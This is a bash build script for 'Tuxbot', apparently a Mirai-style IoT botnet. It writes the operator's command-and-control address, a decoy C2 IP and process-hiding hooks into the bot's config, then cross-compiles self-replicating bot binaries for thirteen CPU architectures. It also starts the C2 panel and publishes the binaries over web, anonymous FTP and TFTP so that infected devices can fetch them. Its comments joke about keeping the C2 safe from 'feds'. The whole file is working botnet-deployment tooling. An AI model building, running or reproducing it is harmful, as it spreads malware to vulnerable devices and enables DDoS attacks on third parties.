#!/bin/bash

# by juan @ipmiv2 on telegram

GRAY='\033[90m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
RESET='\033[0m'

log() {
    local level="$1"; shift
    local ts=$(date '+%I:%M %p')
    case "$level" in
        INFO) echo -e "${GRAY}${ts} ${GREEN}INFO${RESET} $*" ;;
        WARN) echo -e "${GRAY}${ts} ${YELLOW}WARN${RESET} $*" ;;
        ERROR) echo -e "${GRAY}${ts} ${RED}ERROR${RESET} $*" ;;
        *) echo -e "${GRAY}${ts} ${GREEN}${level}${RESET} $*" ;;
    esac
}

CONFIG_FILE="./tuxbot.conf"

CNC_DOMAIN=""
CNC_TELNET_PORT="1999"
CNC_API_PORT="8098"
USE_DOMAIN="n"
SELFREP="y"
TUXBOT_USER=""
TUXBOT_PASS=""

load_config() {
    [ -f "$CONFIG_FILE" ] && source "$CONFIG_FILE" && log INFO "Loaded config from $CONFIG_FILE"
}

save_config() {
    cat > "$CONFIG_FILE" << EOF
# this source suck and it dosent now, awwww 
CNC_DOMAIN="$CNC_DOMAIN"
CNC_TELNET_PORT="$CNC_TELNET_PORT"
CNC_API_PORT="$CNC_API_PORT"
USE_DOMAIN="$USE_DOMAIN"
SELFREP="$SELFREP"
TUXBOT_USER="$TUXBOT_USER"
TUXBOT_PASS="$TUXBOT_PASS"
EOF
    log INFO "Saved config to $CONFIG_FILE"
}

show_help() {
    echo "Usage: ./build.sh [options]"
    echo ""
    echo "Options:"
    echo "  -d, --domain <ip>    CNC server domain/IP (enables USEDOMAIN mode)"
    echo "  -p, --port <port>    CNC telnet panel port (default: 1999)"
    echo "  -h, --help           Show this help"
    echo ""
    echo "Without options, prompts interactively, saves config to ~/tuxbot.conf"
    exit 0
}

load_config

while [[ $# -gt 0 ]]; do
    case $1 in
        -d|--domain) CNC_DOMAIN="$2"; USE_DOMAIN="y"; shift 2 ;;
        -p|--port) CNC_TELNET_PORT="$2"; shift 2 ;;
        -h|--help) show_help ;;
        *) log ERROR "Unknown option: $1"; show_help ;;
    esac
done

if [ -z "$CNC_DOMAIN" ]; then
    echo ""
    echo "================================"
    echo "  Tuxbot automated builer by juan (@ipmiv2)"
    echo "================================"
    echo ""
    read -p "Enter CNC server IP or domain: " CNC_DOMAIN
    echo ""
fi

[ "$CNC_TELNET_PORT" != "1999" ] && log WARN "Bot table encodes CNC port as 1999. Changing telnet port may break bot connections unless table is re-encoded with enc/enc.c"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CNC_DIR="$SCRIPT_DIR/cnc"

if [ ! -f "$CNC_DIR/cnc.db" ] && [ -z "$TUXBOT_USER" ]; then
    echo ""
    echo "======================================================="
    echo "  since its the first time you gotta make a user, make sure u do type some hard ahh password so u dont get ur c2 brute forced by feds lmao"
    echo "======================{{{==============================="
    echo ""
    read -p "Admin username [root]: " TUXBOT_USER
    TUXBOT_USER="${TUXBOT_USER:-root}"
    while true; do
        read -s -p "Admin password: " TUXBOT_PASS
        echo ""
        [ -n "$TUXBOT_PASS" ] && break
        echo "Password cannot be empty"
    done
    read -s -p "Confirm password: " pass2
    echo ""
    if [ "$TUXBOT_PASS" != "$pass2" ]; then
        log ERROR "Passwords don't match"
        exit 1
    fi
    echo ""
fi

save_config

if [ "$EUID" -ne 0 ]; then
    log ERROR "Please run as root"; exit 1
fi

if [ ! -f /etc/os-release ]; then
    log ERROR "Unsupported operating system"; exit 1
fi

source /etc/os-release
if [[ "$ID" != "ubuntu" && "$ID" != "debian" && "$ID_LIKE" != *"debian"* ]]; then
    log ERROR "Only Ubuntu/Debian supported (Detected: $ID)"; exit 1
fi

log INFO "Running as root on $NAME $VERSION_ID"

export DEBIAN_FRONTEND=noninteractive

log INFO "Installing required packages..."
apt-get update -yq >/dev/null 2>&1
apt-get install -yq wget unzip zip gcc screen bzip2 git curl \
    apache2 tftpd-hpa vsftpd \
    gcc-multilib >/dev/null 2>&1

if ! command -v go &> /dev/null; then
    log INFO "Installing Go..."
    apt-get install -yq golang-go >/dev/null 2>&1 || {
        log INFO "Installing Go 1.21 from tarball..."
        cd /tmp
        wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
        rm -rf /usr/local/go
        tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
        export GOROOT=/usr/local/go
        export PATH=$GOROOT/bin:$PATH
        echo 'export GOROOT=/usr/local/go' >> /etc/profile
        echo 'export PATH=$GOROOT/bin:$PATH' >> /etc/profile
    }
fi

BOT_DIR="$SCRIPT_DIR/bot"

if [ ! -d "$BOT_DIR" ] || [ ! -d "$CNC_DIR" ]; then
    log ERROR "'bot' or 'cnc' directory not found! Run the script in the project root."
    exit 1
fi

log INFO "Checking cross-compilers..."
mkdir -p /etc/xcompile
cd /etc/xcompile

download_compiler() {
    local arch="$1"
    local file="$2"
    local dir="$3"
    if [ ! -d "/etc/xcompile/$arch" ]; then
        local url="${4:-https://raw.githubusercontent.com/R00tS3c/DDOS-RootSec/master/uclib-cross-compilers/$file}"
        log INFO "Downloading $arch compiler..."
        wget -q "$url" -O "$file"
        if [ $? -eq 0 ]; then
            if [[ "$file" == *".tar.gz" ]]; then
                tar -xzf "$file" >/dev/null 2>&1
            else
                tar -xjf "$file" >/dev/null 2>&1
            fi
            if [ ! -d "$dir" ]; then
                dir="$(find . -maxdepth 1 -type d ! -name '.' ! -name '..' -printf '%f\n' 2>/dev/null | head -1)"
            fi
            [ -n "$dir" ] && mv "$dir" "$arch" 2>/dev/null || log WARN "Could not rename extracted dir for $arch"
            rm -f "$file"
        else
            log WARN "Could not download $arch compiler"
        fi
    else
        log INFO "$arch compiler already exists, skipping."
    fi
}

download_compiler "armv4l" "cross-compiler-armv4l.tar.bz2" "cross-compiler-armv4l"
download_compiler "armv5l" "cross-compiler-armv5l.tar.bz2" "cross-compiler-armv5l"
download_compiler "armv6l" "cross-compiler-armv6l.tar.bz2" "cross-compiler-armv6l"
download_compiler "armv7l" "cross-compiler-armv7l.tar.bz2" "cross-compiler-armv7l"
download_compiler "i586"   "cross-compiler-i586.tar.bz2"    "cross-compiler-i586"
download_compiler "i686"   "cross-compiler-i686.tar.bz2"    "cross-compiler-i686"
download_compiler "m68k"   "cross-compiler-m68k.tar.bz2"    "cross-compiler-m68k"
download_compiler "mips"   "cross-compiler-mips.tar.bz2"    "cross-compiler-mips"
download_compiler "mipsel" "cross-compiler-mipsel.tar.bz2"  "cross-compiler-mipsel"
download_compiler "powerpc" "cross-compiler-powerpc.tar.bz2" "cross-compiler-powerpc"
download_compiler "sh4"    "cross-compiler-sh4.tar.bz2"     "cross-compiler-sh4"
download_compiler "sparc"  "cross-compiler-sparc.tar.bz2"   "cross-compiler-sparc"
download_compiler "x86_64" "cross-compiler-x86_64.tar.bz2"  "cross-compiler-x86_64"

export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin

log INFO "Updating bot/config.h with server IP: $CNC_DOMAIN..."
cd "$BOT_DIR"

# Write fresh config.h with the user's IP
cat > headers/config.h << CONFIGEOF
#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define BUFFER 1024
#define HOSTNAME_MAX_LEN 256

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define FALSE 0
#define TRUE 1

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define FAKE_CNC_ADDR INET_ADDR(176,123,26,89)
#define FAKE_CNC_PORT 23

#ifndef USEDOMAIN
#define SCANIP (int)inet_addr((const char*)"$CNC_DOMAIN");
#define SERVIP (int)inet_addr((const char*)"$CNC_DOMAIN");

#else

#define SCANDOM "$CNC_DOMAIN"
#define SERVDOM "$CNC_DOMAIN"
#define SCANIP (int)inet_addr((const char*)"$CNC_DOMAIN");
#define SERVIP (int)inet_addr((const char*)"$CNC_DOMAIN");

#endif

extern ipv4_t LOCAL_ADDR;

void hide_processes(void);
CONFIGEOF

log INFO "config.h updated with server $CNC_DOMAIN"

cd "$BOT_DIR"
mkdir -p release

# Build flags
BOT_FLAGS=""
[ "$SELFREP" == "y" ] && BOT_FLAGS="$BOT_FLAGS -DSELFREP"
[ "$USE_DOMAIN" == "y" ] && BOT_FLAGS="$BOT_FLAGS -DUSEDOMAIN -DC2_DOMAIN=\"$CNC_DOMAIN\""

compile_bot() {
    local arch="$1"
    local output="$2"
    local extra="$3"
    local compiler="/etc/xcompile/$arch/bin/$arch-gcc"

    if [ ! -f "$compiler" ]; then
        if command -v "$arch-gcc" &> /dev/null; then
            compiler="$arch-gcc"
        else
            log ERROR "Compiler for $arch not found at $compiler"
            return 1
        fi
    fi

    local extra_ld=""
    [[ "$extra" == *"-static"* ]] && extra_ld="-Wl,--allow-multiple-definition"

    "$compiler" -std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
        -Wl,--gc-sections $extra $extra_ld $BOT_FLAGS \
        *.c -o release/"$output" -ldl 2>/dev/null

    if [ $? -eq 0 ]; then
        local strip="${compiler%-gcc}-strip"
        [ -f "$strip" ] && "$strip" -S --strip-unneeded \
            --remove-section=.comment --remove-section=.note \
            release/"$output"
        log INFO "Compiled: $output"
    else
        log INFO "Retrying $output without -static..."
        "$compiler" -std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections \
            -Wl,--gc-sections $(echo "$extra" | sed 's/-static//g') $BOT_FLAGS \
            *.c -o release/"$output" -ldl 2>/dev/null
        if [ $? -eq 0 ]; then
            log INFO "Compiled: $output (dynamic)"
        else
            log ERROR "Failed: $output"
        fi
    fi
}

log INFO "Compiling bots for 16 architectures..."

compile_bot "i586"   "x86"   "-static"
compile_bot "mips"   "mips"  "-static"
compile_bot "mipsel" "mpsl"  "-static"
compile_bot "armv4l" "arm"   "-static"
compile_bot "armv5l" "arm5"  "-static"
compile_bot "armv6l" "arm6"  "-static"
compile_bot "armv7l" "arm7"  "-static"
compile_bot "powerpc" "ppc"  "-static"
compile_bot "sparc"  "spc"   "-static"
compile_bot "m68k"   "m68k"  "-static"
compile_bot "sh4"    "sh4"   "-static"
compile_bot "x86_64" "x86_64" "-static"
compile_bot "i686"   "i686"  "-static"

log INFO "Compiling local debug binary..."
gcc -std=c99 *.c -DDEBUG -DKILLER -static -g -o release/dbg -DLOCAL -ldl 2>/dev/null
if [ $? -eq 0 ]; then
    strip --strip-unneeded release/dbg 2>/dev/null
    log INFO "Compiled: dbg (local debug)"
else
    log WARN "Local debug build failed (may be missing native deps)"
fi

log INFO "Compiling CNC..."
cd "$CNC_DIR"
go mod tidy 2>/dev/null
go build -o tuxbot-cnc . 2>/dev/null
if [ $? -eq 0 ]; then
    log INFO "CNC compiled: cnc/tuxbot-cnc"
else
    log ERROR "CNC compilation failed"
    exit 1
fi

log INFO "Starting CNC in screen session (name: tuxbot)..."
pkill -9 tuxbot-cnc 2>/dev/null
screen -S tuxbot -X quit 2>/dev/null || true
screen -dmS tuxbot bash -c "ulimit -n 999999; export TUXBOT_USER=\"$TUXBOT_USER\" TUXBOT_PASS=\"$TUXBOT_PASS\"; cd $CNC_DIR && ./tuxbot-cnc"
log INFO "CNC started on 0.0.0.0:$CNC_TELNET_PORT (telnet) and :8098 (API)"
log INFO "Monitor: screen -x tuxbot"

log INFO "Deploying binaries..."
rm -rf /var/www/html/bins /var/www/html /var/ftp /var/lib/tftpboot
mkdir -p /var/www/html/bins /var/ftp /var/lib/tftpboot

cp "$BOT_DIR/release/"* /var/www/html/bins/ 2>/dev/null
cp "$BOT_DIR/release/"* /var/ftp/ 2>/dev/null
cp "$BOT_DIR/release/"* /var/lib/tftpboot/ 2>/dev/null

chmod -R 755 /var/www/html /var/ftp /var/lib/tftpboot

log INFO "Setting up TFTP..."
systemctl restart tftpd-hpa 2>/dev/null || service tftpd-hpa restart 2>/dev/null || true

log INFO "Setting up FTP..."
if [ -f /etc/vsftpd.conf ]; then
    sed -i 's/^anonymous_enable=.*/anonymous_enable=YES/' /etc/vsftpd.conf 2>/dev/null
    sed -i 's/^local_enable=.*/local_enable=NO/' /etc/vsftpd.conf 2>/dev/null
    echo "anon_root=/var/ftp" >> /etc/vsftpd.conf 2>/dev/null
fi
systemctl restart vsftpd 2>/dev/null || service vsftpd restart 2>/dev/null || true

log INFO "Starting Apache..."
systemctl restart apache2 2>/dev/null || service apache2 restart 2>/dev/null || true

log INFO ""
log INFO "========================================"
log INFO "  Tuxbot Build Complete! (have fun bro!)"
log INFO "========================================"
log INFO "CNC Telnet:  0.0.0.0:$CNC_TELNET_PORT"
log INFO "CNC API:     0.0.0.0:8098 (Basic auth)"
log INFO "Binaries:    /var/www/html/bins/"
log INFO "             /var/ftp/"
log INFO "             /var/lib/tftpboot/"
log INFO "Local:       $BOT_DIR/release/"
if [ -n "$TUXBOT_USER" ]; then
    log INFO "Admin user: $TUXBOT_USER:<hiddenforsecuriyy>"
else
    log INFO "whatthefuck"
fi
log INFO ""
log INFO "To monitor CNC: screen -x tuxbot"
log INFO ""

ls -lh "$BOT_DIR/release/" 2>/dev/null
